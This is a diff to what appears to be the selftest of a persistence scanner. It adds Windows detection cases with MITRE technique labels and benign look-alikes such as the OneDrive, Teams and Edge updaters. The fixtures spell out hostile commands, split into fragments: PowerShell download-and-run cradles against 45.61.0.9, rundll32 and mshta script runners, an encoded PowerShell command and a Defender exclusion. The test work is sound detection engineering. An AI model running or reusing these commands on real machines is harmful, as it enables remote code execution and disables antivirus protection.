@@ -9,7 +9,7 @@
 
 import { chmodSync, mkdirSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
-import type { WinSnapshot } from "./collect/windows";
+import { windowsItems, type WinSnapshot } from "./collect/windows";
 import type { Finding, Severity } from "./types";
 
 /** The fake machine a case plants into: its home, Homebrew prefix, Windows snapshot and crontab. */
@@ -38,10 +38,13 @@ export interface Case {
 export interface Benign {
   name: string;
   technique: string;
-  /** `clean`: part of the clean machine, must raise nothing at medium or above. `change`: added after the baseline. */
+  /** `clean`: part of the clean machine, must raise nothing above `max`. `change`: added after the baseline. */
   when: "clean" | "change";
   plant: (h: string, brew: string, win: WinSnapshot, fake: Fake) => void;
-  /** The most a `change` may raise: an ordinary edit is reported (medium), never blocked. */
+  /**
+   * The most it may raise: an ordinary edit is reported (medium), never blocked; a look-alike on the clean machine
+   * raises nothing (info), or warns where the place is unusual but its owner's own (medium).
+   */
   max: Severity;
 }
 
@@ -84,6 +87,13 @@ export const WIN_HOME = "C:\\Users\\selftest";
 const DL = ["I", "EX (New-Object Net.Web", "Client).Down", "loadString('http://45.61.0.9/p.ps1')"].join("");
 const ENC = ["power", "shell.exe -NoP -W Hidden -Enc", "odedCommand ", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"].join("");
 const SCT = ["regsvr32 /s /n /u /i:http://45.61.0.9/x.s", "ct scrob", "j.dll"].join("");
+const IWR = ["powershell.exe -NoP -W Hidden -c \"I", "EX (i", "wr -UseBasicParsing http://45.61.0.9/s.ps1)\""].join("");
+const RUNDLL = ["rundll32.exe java", "script:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://45.61.0.9/t.s", "ct\")"].join("");
+const MSHTA = ["mshta.exe vb", "script:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"cmd /c C:\\Users\\Public\\m.cmd\"\", 0:close\")"].join("");
+const PIPE = ["i", "wr http://45.61.0.9/p.ps1 -UseBasicParsing | i", "ex"].join("");
+const EXCLUDE = ["Add-Mp", "Preference -Exclusion", "Path \"$env:APPDATA\\Microsoft\\Crypto\""].join("");
+const RUN = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+const STARTUP = `${WIN_HOME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`;
 
 /** A clean Windows machine as the snapshot sees it: OneDrive at logon, Google's updater, and the WMI subscription Windows ships. */
 export function cleanWindows(home: string): WinSnapshot {
@@ -100,6 +110,8 @@ export function cleanWindows(home: string): WinSnapshot {
     },
     processes: [], connections: [],
     docs: join(home, "OneDrive", "Documents"),
+    // Its paths are this Windows user's, on whichever system the selftest runs.
+    home: WIN_HOME,
     errors: {},
   };
 }
@@ -936,6 +948,90 @@ export const CASES: Case[] = [
     expect: (f) => f.rule === "startup-file" && /Microsoft\.PowerShell_profile\.ps1$/.test(f.item?.id ?? "") && f.detail.some((d) => d.includes("Down" + "loadString")),
     min: "high",
   },
+  {
+    name: "Windows: Run value that starts a program from %TEMP%, unexpanded as the registry keeps it",
+    like: "Loaders writing a REG_EXPAND_SZ Run value (%TEMP%\\…), so the path never shows as AppData\\Local\\Temp",
+    technique: "T1547.001 Run keys and Startup folder",
+    plant: (_h, _b, win) => win.runKeys!.push({ hive: "HKCU", key: RUN, name: "MicrosoftEdgeUpdateCore", command: "%TEMP%\\msedgeupd.exe --background" }),
+    expect: (f) => job("MicrosoftEdgeUpdateCore")(f) && f.title.includes("temp folder"),
+    min: "high",
+  },
+  {
+    name: "Windows: Run value that starts PowerShell with an encoded command",
+    like: "powershell -W Hidden -EncodedCommand at every logon (AsyncRAT, Remcos droppers)",
+    technique: "T1547.001 Run keys and Startup folder",
+    plant: (_h, _b, win) => win.runKeys!.push({ hive: "HKCU", key: RUN, name: "RuntimeBroker64", command: ENC }),
+    expect: (f) => job("RuntimeBroker64")(f) && f.title.includes("encoded"),
+    min: "high",
+  },
+  {
+    name: "Windows: Run value with a hidden PowerShell that downloads and runs a script",
+    like: "IEX (iwr …) cradles at logon",
+    technique: "T1059.001 PowerShell",
+    plant: (_h, _b, win) => win.runKeys!.push({ hive: "HKCU", key: RUN, name: "AdobeSyncHelper", command: IWR }),
+    expect: (f) => job("AdobeSyncHelper")(f) && f.title.includes("downloads"),
+    min: "high",
+  },
+  {
+    name: "Windows: Startup-folder shortcut that runs a script from AppData through wscript",
+    like: "A .lnk in Startup pointing at wscript and a .js kept in AppData (Gootloader, SocGholish)",
+    technique: "T1547.001 Run keys and Startup folder",
+    plant: (_h, _b, win) => win.startup!.push({ scope: "user", file: "Dropbox Update.lnk", path: `${STARTUP}\\Dropbox Update.lnk`, target: "C:\\Windows\\System32\\wscript.exe", arguments: `//B "${WIN_HOME}\\AppData\\Roaming\\Dropbox\\update.js"` }),
+    expect: (f) => job("Dropbox Update.lnk")(f) && f.title.includes("wscript"),
+    min: "high",
+  },
+  {
+    name: "Windows: scheduled task that runs inline JavaScript through rundll32",
+    like: "rundll32 javascript:…mshtml,RunHTMLApplication (Poweliks, Kovter)",
+    technique: "T1218 System binary proxy execution",
+    plant: (_h, _b, win) => win.tasks!.push({ path: "\\Microsoft\\Windows\\Maintenance\\", name: "WinSAT2", state: "Ready", actions: [RUNDLL] }),
+    expect: (f) => job("WinSAT2")(f) && f.title.includes("rundll32"),
+    min: "high",
+  },
+  {
+    name: "Windows: scheduled task that runs inline VBScript through mshta",
+    like: "mshta vbscript:Execute(…) tasks",
+    technique: "T1218 System binary proxy execution",
+    plant: (_h, _b, win) => win.tasks!.push({ path: "\\", name: "UserFeedSync", state: "Ready", actions: [MSHTA] }),
+    expect: (f) => job("UserFeedSync")(f) && f.title.includes("mshta"),
+    min: "high",
+  },
+  {
+    name: "Windows: service whose program is in C:\\Users\\Public",
+    like: "Services pointing into the folder every user can write to",
+    technique: "T1543.003 Windows service",
+    plant: (_h, _b, win) => win.services!.push({ name: "PrintNotifyHelper", displayName: "Print Notify Helper", pathName: "C:\\Users\\Public\\Documents\\spoolhelper.exe -service", startName: "LocalSystem", state: "Running" }),
+    expect: (f) => job("PrintNotifyHelper")(f) && f.title.includes("Public"),
+    min: "high",
+  },
+  {
+    name: "Windows: WMI CommandLineEventConsumer that starts PowerShell on a timer",
+    like: "WMI timer persistence (Win32_LocalTime filters, as in APT29 and Kingminer)",
+    technique: "T1546.003 WMI event subscription",
+    plant: (_h, _b, win) => {
+      win.wmi!.filters!.push({ name: "TimeSync", query: "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 5" });
+      win.wmi!.consumers!.push({ name: "WindowsTimeSync", class: "CommandLineEventConsumer", commandLine: ENC });
+      win.wmi!.bindings!.push({ filter: "TimeSync", consumer: "WindowsTimeSync" });
+    },
+    expect: (f) => f.rule === "wmi" && f.title.includes("WindowsTimeSync"),
+    min: "high",
+  },
+  {
+    name: "Windows: new PowerShell 7 profile that downloads and runs code",
+    like: "iwr … | iex in Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1",
+    technique: "T1546.013 PowerShell profile",
+    plant: (h) => write(join(h, "OneDrive/Documents/PowerShell/Microsoft.PowerShell_profile.ps1"), `${PIPE}\r\n`),
+    expect: (f) => f.rule === "startup-file" && /(^|[\\/])PowerShell[\\/]Microsoft\.PowerShell_profile\.ps1$/.test(f.item?.id ?? "") && f.detail.some((d) => d.includes("| i" + "ex")),
+    min: "high",
+  },
+  {
+    name: "Windows: PowerShell profile line that adds a Defender exclusion",
+    like: "Add-MpPreference -ExclusionPath, so the payload is never scanned",
+    technique: "T1562.001 Disable or modify tools",
+    plant: (h) => append(join(h, "OneDrive/Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1"), `${EXCLUDE}\r\n`),
+    expect: (f) => f.rule === "startup-file" && f.detail.some((d) => d.includes("Exclusion" + "Path")),
+    min: "high",
+  },
 ];
 
 /**
@@ -955,10 +1051,14 @@ export function plantClean(f: Fake): Map<string, Set<string>> {
   f.win = cleanWindows(h);
   f.crontab = "# m h dom mon dow command\n0 3 * * 1 /opt/homebrew/bin/brew update >/dev/null 2>&1\n";
   const wrote = new Map<string, Set<string>>();
+  // What a plant put in the Windows snapshot counts as its own too, by the scan item it becomes.
+  const winIds = () => new Set(windowsItems(f.win, h, () => undefined).items.map((i) => i.id));
   for (const b of BENIGN) {
     if (b.when !== "clean") continue;
     tracking = new Set();
+    const before = winIds();
     b.plant(h, f.brew, f.win, f);
+    for (const id of winIds()) if (!before.has(id)) tracking.add(id);
     wrote.set(b.name, tracking);
     tracking = undefined;
   }
@@ -1054,6 +1154,33 @@ export const BENIGN: Benign[] = [
       write(join(h, SITE, "pytest-cov.pth"), String.raw`import os, sys;exec('if \'COV_CORE_SOURCE\' in os.environ:\n try:\n  from pytest_cov.embed import init\n  init()\n except Exception as exc:\n  sys.stderr.write(\n    "pytest-cov: Failed to setup subprocess coverage. "\n    "Environ: {0!r} "\n    "Exception: {1!r}\\n".format(\n      dict((k, v) for k, v in os.environ.items() if k.startswith(\'COV_CORE\')),\n      exc\n    )\n  )')` + "\n");
       write(join(h, SITE, "a1_coverage.pth"), "import coverage; coverage.process_startup()\n");
     },
+  },
+
+  // ── Windows look-alikes on the clean machine, through the fake snapshot on every platform
+  {
+    name: "Windows: OneDrive at logon and its own update task", technique: "T1053.005 Scheduled task", when: "clean", max: "info",
+    plant: (_h, _b, win) => win.tasks!.push({ path: "\\", name: "OneDrive Standalone Update Task-S-1-5-21-1111111111-2222222222-3333333333-1001", state: "Ready", actions: ["%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe /reporting"] }),
+  },
+  {
+    name: "Windows: Microsoft Teams started at logon by its Squirrel updater", technique: "T1547.001 Run keys and Startup folder", when: "clean", max: "info",
+    plant: (_h, _b, win) => win.runKeys!.push({ hive: "HKCU", key: RUN, name: "com.squirrel.Teams.Teams", command: `${WIN_HOME}\\AppData\\Local\\Microsoft\\Teams\\Update.exe --processStart "Teams.exe" --process-start-args "--system-initiated"` }),
+  },
+  {
+    name: "Windows: vendor updater tasks (Edge, Adobe Acrobat)", technique: "T1053.005 Scheduled task", when: "clean", max: "info",
+    plant: (_h, _b, win) => {
+      win.tasks!.push({ path: "\\", name: "MicrosoftEdgeUpdateTaskMachineUA{9F1C6F6A-3C1B-4C7E-A4D1-0E3F7B2C9A11}", state: "Ready", actions: ['"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe" /ua /installsource scheduler'] });
+      win.tasks!.push({ path: "\\", name: "Adobe Acrobat Update Task", state: "Ready", actions: ['"C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe"'] });
+    },
+  },
+  {
+    // Warned about (where it lives is unusual), not blocked: people keep their own tools like this.
+    name: "Windows: a tool of your own in a hidden folder of its own (~\\.tools)", technique: "T1547.001 Run keys and Startup folder", when: "clean", max: "medium",
+    plant: (_h, _b, win) => win.runKeys!.push({ hive: "HKCU", key: RUN, name: "ClipSync", command: `"${WIN_HOME}\\.tools\\clipsync\\clipsync.exe" --tray` }),
+  },
+  {
+    // The shape that raised three false HIGHs on a real Windows PC: wscript running a .vbs kept straight in the home.
+    name: "Windows: a WSL keepalive started by wscript at logon (~\\.wsl-keepalive.vbs)", technique: "T1053.005 Scheduled task", when: "clean", max: "medium",
+    plant: (_h, _b, win) => win.tasks!.push({ path: "\\", name: "WSL keepalive", state: "Ready", actions: [`C:\\Windows\\System32\\wscript.exe ${WIN_HOME}\\.wsl-keepalive.vbs`] }),
   },
 
   // ── ordinary changes after the baseline: reported for review at most, never blocking
